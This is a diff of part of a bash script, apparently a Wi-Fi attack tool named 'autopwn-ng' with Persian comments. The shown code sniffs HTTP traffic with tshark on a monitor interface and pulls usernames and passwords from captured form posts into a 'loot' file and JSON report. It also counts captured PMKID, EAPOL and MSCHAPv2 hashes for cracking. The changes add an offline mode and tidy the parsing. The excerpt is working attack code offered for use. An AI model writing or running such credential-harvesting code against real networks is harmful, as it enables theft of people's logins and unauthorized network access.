-        printf '%s\t%s\t%s\tPOST\t%s\t%s\t%s\tForm\n' \
-          "${ts:-}" "${src:-}" "${host:-}" "${uri:-}" "$user" "$pass" >> "$LOOT"
-        [ -n "$user" ] && ok "Form cred: $user / $pass  ($host$uri)"
-      fi
-    done
-  }
-
   # پردازش capture موجود
   parse_pcap_creds "$CAP"
 
-  # برداشت زنده (کوتاه) از ترافیک HTTP
-  if command -v tshark >/dev/null; then
+  # برداشت زنده (کوتاه) از ترافیک HTTP (فقط در حالت online)
+  if [ "$OFFLINE" -ne 1 ]; then
     c "  → برداشت زنده HTTP برای ${HARVEST_TIME}s روی $MON"
     timeout "$HARVEST_TIME" tshark -i "$MON" -Y http -w "$WORK/http-live.pcapng" >/dev/null 2>&1 || true
     parse_pcap_creds "$WORK/http-live.pcapng"
@@ -771,15 +1433,20 @@ if [ "$SKIP_TO" -le 7 ] && [ "$DO_HARVEST" -eq 1 ] && [ -s "$WORK/cracked.txt" ]
 
   # خلاصه JSON (اختیاری)
   if command -v jq >/dev/null && [ -s "$LOOT" ]; then
-    tail -n +2 "$LOOT" | awk -F'\t' '{printf "{\"ts\":\"%s\",\"src\":\"%s\",\"host\":\"%s\",\"method\":\"%s\",\"uri\":\"%s\",\"user\":\"%s\",\"pass\":\"%s\",\"type\":\"%s\"}\n",$1,$2,$3,$4,$5,$6,$7,$8}' \
-      | jq -s '.' > "$REPORT/loot.json" 2>/dev/null || true
+    tail -n +2 "$LOOT" | jq -s -R 'split("\n") | map(select(. != "") | split("\t") | {ts:.[0], src:.[1], host:.[2], method:.[3], uri:.[4], user:.[5], pass:.[6], type:.[7]})' \
+      > "$REPORT/loot.json" 2>/dev/null || true
   fi
 
-  if [ "$(wc -l < "$LOOT")" -gt 1 ]; then
+  n_loot=$(wc -l < "$LOOT")
+  if [ "$n_loot" -gt 1 ]; then
     ok "اعتبارنامه‌های HTTP ذخیره شدند: $LOOT"
-    c "تعداد: $(( $(wc -l < "$LOOT") - 1 ))"
+    c "تعداد: $(( n_loot - 1 ))"
   else
     warn "هیچ اعتبارنامهٔ HTTP در ترافیک یافت نشد."
+  fi
+else
+  if [ "$DO_HARVEST" -eq 1 ] && [ -s "$WORK/cracked.txt" ]; then
+    warn "tshark یافت نشد — فاز ۷ (برداشت HTTP) رد شد."
   fi
 fi
 
@@ -787,7 +1454,7 @@ fi
 if [ "$SKIP_TO" -le 8 ]; then
 PMKID_N=$(grep -c '^\*\*\*\*' "$HASH" 2>/dev/null || true)
 EAPOL_N=$(grep -c 'WPA\*02' "$HASH" 2>/dev/null || true)
-EAP_N=$(wc -l < "$WORK/mschapv2.txt" 2>/dev/null || true)
+if [ -f "$WORK/mschapv2.txt" ]; then EAP_N=$(wc -l < "$WORK/mschapv2.txt" 2>/dev/null || echo 0); else EAP_N=0; fi
 PMKID_N=${PMKID_N:-0}
 EAPOL_N=${EAPOL_N:-0}
 EAP_N=${EAP_N:-0}
@@ -795,7 +1462,7 @@ hr
 {
   echo "# گزارش autopwn-ng"
   echo "تاریخ: $(date -Is)"
-  echo "پروفایل: $PROFILE | مدت برداشت: ${CAPTURE}s | مونیتور: $MON"
+  echo "پروفایل: $PROFILE | مدت برداشت: ${CAPTURE}s | مونیتور: ${MON:-(offline)}"
   echo
   echo "## هش‌ها"
   echo "- PMKID: $PMKID_N"
